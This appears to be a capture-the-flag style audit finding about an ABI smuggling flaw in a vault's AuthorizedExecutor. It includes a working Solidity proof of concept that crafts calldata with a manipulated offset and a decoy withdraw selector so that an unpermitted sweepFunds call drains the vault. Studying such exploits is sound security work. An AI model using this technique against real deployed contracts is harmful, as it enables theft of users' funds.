# ABI Smuggling in `AuthorizedExecutor.execute()`

## Summary

The `execute()` function in `AuthorizedExecutor` is vulnerable to ABI smuggling attacks where an attacker can manipulate dynamic calldata offsets to bypass access control checks and execute unauthorized function calls on the vault, allowing complete draining of funds.

## Description

The `execute()` assume that `actionData` will always start at a fixed position:

```
function execute(...)  {
    bytes4 selector;
    uint256 calldataOffset = 4 + 32 * 3;
    assembly {
        selector := calldataload(calldataOffset)
    }

    if (!permissions[getActionId(selector, msg.sender, target)]) {
        revert NotAllowed();
    }
    //...
}
```

The vulnerability arises from Solidity's ABI decoding of dynamic types. When the ABI decoder processes the `bytes calldata actionData` parameter, it reads an offset value that points to where the actual dynamic data begins. By manipulating this offset, an attacker can cause the decoder to read different data but still add the permissioned function selector at th fixed position that `execute()` checks.

## Proof of Concept

The exploit constructs calldata with the following structure:

```
Offset  | Content                          | Purpose
--------|----------------------------------|----------------------------------
0x00    | execute.selector (4 bytes)       | Function to call
0x04    | vault address (32 bytes)         | Target contract
0x24    | 0x80 (32 bytes)                  | Fake offset pointing to 0x80
0x44    | 0x00 (32 bytes)                  | Empty data for padding
0x64    | withdraw.selector (32 bytes)     | Decoy function selector
0x84    | actionDataLength (32 bytes)      | Length of smuggled data
0xA4    | sweepFundsCalldata               | Actual malicious calldata
```

```solidity
function test_abiSmuggling() public checkSolvedByPlayer {
    // Step 1: Encode the intended malicious call
    // `vault.sweepFunds(player, IERC20(address(token)))`
    bytes memory sweepFundsCalldata =
        abi.encodeWithSelector(
            SelfAuthorizedVault.sweepFunds.selector,
            recovery,
            IERC20(address(token))
        );
    uint256 actionDataLength = sweepFundsCalldata.length;

    // Step 2: Construct smuggled calldata with manipulated offset
    //
    // Memory layout:
    // [executeSelector(4)][paddedTargetAddress(32)][actionDataOffset(32)]
    // [empty(32)][paddedWithdrawSelector(32)][actionDataLength(32)][sweepFundsCalldata]
    //
    // The offset 0x80 points to where actionDataLength begins
    // This causes the decoder to read sweepFundsCalldata instead of withdraw
    bytes memory smuggledCalldata = abi.encodePacked(
        AuthorizedExecutor.execute.selector,     // executeSelector (4)
        abi.encodePacked(bytes12(0), address(vault)), // paddedTargetAddress (32)
        abi.encodePacked(uint256(0x80)),         // actionDataOffset (32) - MANIPULATED
        bytes32(0),                               // empty (32) - spacing
        abi.encodePacked(SelfAuthorizedVault.withdraw.selector, bytes28(0)), // paddedWithdrawSelector (32) - DECOY
        actionDataLength,                         // actionDataLength (32)
        sweepFundsCalldata                        // sweepFundsCalldata - ACTUAL CALL
    );

    // Step 3: Execute the smuggled call
    (bool success,) = address(vault).call(smuggledCalldata);
    require(success, "Call failed");

    // Funds are now drained to recovery address
}
```

## Recommended Mitigation

To prevent ABI smuggling attacks, the `execute()` function should be refactored to avoid relying on fixed calldata offsets for permission checks.
